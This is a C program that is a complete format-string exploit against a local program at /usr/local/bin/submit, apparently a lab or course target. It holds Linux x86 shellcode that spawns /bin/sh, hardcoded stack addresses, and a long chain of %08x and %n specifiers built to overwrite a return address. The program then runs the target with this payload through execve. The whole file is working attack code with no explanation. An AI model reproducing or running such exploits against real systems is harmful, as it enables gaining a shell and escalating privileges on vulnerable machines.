#include<stdio.h>
#include<string.h>

int main(){
	FILE *fp;
	char *args[4];
	char *env[1];
	int i;
	int count = 130;
	int p_cmd_len = 0;
  	char shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
	char p_cmd[] = "PPP"
			"1111" "\x5c\xda\xbf\xff"
			"1111" "\x5e\xda\xbf\xff"
			"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%55246x.%n.%9143x.%n";
	char* cmd = (char*)malloc(1000);
	p_cmd_len = strlen(p_cmd);
	strcpy(cmd, p_cmd);
	for(i =p_cmd_len;i<1000;i++){
		cmd[i] = 'a';
	}
	args[0] = "/usr/local/bin/submit"; args[1] = cmd; 
  	args[2] = "message"; args[3] = NULL;
  	env[0] = NULL;
  	if (execve(args[0], args, env) < 0)
    		fprintf(stderr, "execve failed.\n");
	exit(0);
}




